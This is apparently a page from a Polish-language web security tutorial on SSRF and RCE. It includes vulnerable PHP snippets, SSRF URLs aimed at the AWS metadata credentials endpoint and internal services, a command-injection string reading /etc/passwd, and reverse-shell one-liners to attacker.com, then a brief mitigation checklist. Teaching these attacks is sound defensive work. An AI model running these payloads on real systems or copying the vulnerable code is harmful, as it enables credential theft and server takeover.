---
id: "ssrf-rce"
title: "🚨 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)"
sidebar_position: 12
---

# 🚨 Server-Side Request Forgery (SSRF) & Remote Code Execution (RCE)

SSRF i RCE to jedne z najbardziej niebezpiecznych podatności w aplikacjach webowych. Pozwalają atakującym na wykonywanie nieautoryzowanych żądań wewnętrznych oraz zdalne wykonywanie kodu na serwerze.

---

## 🔍 Server-Side Request Forgery (SSRF)
SSRF pozwala atakującemu na manipulowanie żądaniami HTTP wysyłanymi przez serwer. Może to prowadzić do ujawnienia wewnętrznych zasobów, eksfiltracji danych lub eskalacji ataku.

### **1️⃣ SSRF w chmurze**
W środowiskach chmurowych, takich jak AWS, Google Cloud czy Azure, SSRF może być wykorzystany do uzyskania kluczy dostępu i przejęcia infrastruktury.

#### **Przykładowe podatne żądanie**
Aplikacja pobiera obraz z podanego przez użytkownika URL:
```php
file_get_contents($_GET['url']);
```
Atakujący może użyć tego mechanizmu do dostępu do metadanych chmury AWS:
```http
http://example.com?url=http://169.254.169.254/latest/meta-data/
```
Przykładowa odpowiedź może zawierać:
```
instance-id: i-1234567890abcdef
role-name: admin-role
```
Aby pobrać klucz dostępu AWS:
```http
http://example.com?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```
Jeśli odpowiedź zwróci klucz AWS, atakujący może uzyskać pełen dostęp do konta chmurowego.

### **2️⃣ Wykorzystanie SSRF do dostępu do wewnętrznych zasobów**
SSRF można także wykorzystać do skanowania wewnętrznych systemów lub eksploracji API:
```http
http://example.com?url=http://127.0.0.1:8080/admin
```
Jeśli serwer odpowiada, atakujący może uzyskać dostęp do zasobów, które nie powinny być publiczne.

SSRF może być również wykorzystane do ataków na bazy danych, np. Redis:
```http
http://example.com?url=redis://127.0.0.1:6379/
```
Lub do ataku na usługi HTTP, np. Elasticsearch:
```http
http://example.com?url=http://localhost:9200/_search?q=*
```

---

## 💥 Remote Code Execution (RCE)
RCE to krytyczna podatność, która pozwala atakującemu na wykonywanie dowolnych komend systemowych na serwerze.

### **1️⃣ Wykrywanie podatności RCE**
Najczęstsze miejsca podatne na RCE to:
- **Niebezpieczne funkcje w PHP**: `eval()`, `system()`, `exec()`
- **Nieprawidłowa obsługa wejścia użytkownika w Python, Node.js, Bash**
- **Źle skonfigurowane API umożliwiające zdalne wywołanie funkcji**

#### **Przykładowy podatny kod w PHP**
```php
$cmd = $_GET['cmd'];
system($cmd);
```
Atakujący może wykonać polecenie systemowe:
```http
http://example.com?cmd=whoami
```

### **2️⃣ Eksploatacja RCE**
#### **Wstrzykiwanie komend systemowych**
Jeśli aplikacja wykonuje komendy systemowe bez odpowiedniego filtrowania, można je manipulować:
```http
http://example.com?cmd=ls
```
Jeżeli aplikacja używa operatorów `&&`, `|`, `;`, można łączyć komendy:
```http
http://example.com?cmd=whoami;id;cat /etc/passwd
```

#### **Uzyskanie Reverse Shell**
Jeśli aplikacja jest podatna na RCE, można uzyskać pełną kontrolę nad serwerem poprzez otwarcie sesji odwrotnej (reverse shell).

Atakujący uruchamia listener na swoim serwerze:
```bash
nc -lvnp 4444
```
Następnie wykonuje na podatnym serwerze polecenie otwierające sesję:
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```
Jeśli serwer obsługuje PHP, można wykonać:
```php
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🔐 Jak zabezpieczyć aplikację przed SSRF i RCE?
✅ **Blokowanie dostępu do adresów lokalnych (`127.0.0.1`, `169.254.169.254`)**
✅ **Walidacja i whitelisting URL w przypadku pobierania zasobów**
✅ **Wyłączanie niebezpiecznych funkcji w PHP (`exec()`, `system()`)**
✅ **Stosowanie firewalli aplikacyjnych (WAF) do blokowania podejrzanych żądań**
✅ **Ograniczenie uprawnień procesów działających w systemie**

---

SSRF i RCE to podatności, które mogą prowadzić do pełnego przejęcia systemu. Kolejnym krokiem będzie analiza podatności **Cross-Site Request Forgery (CSRF)**! 🚀
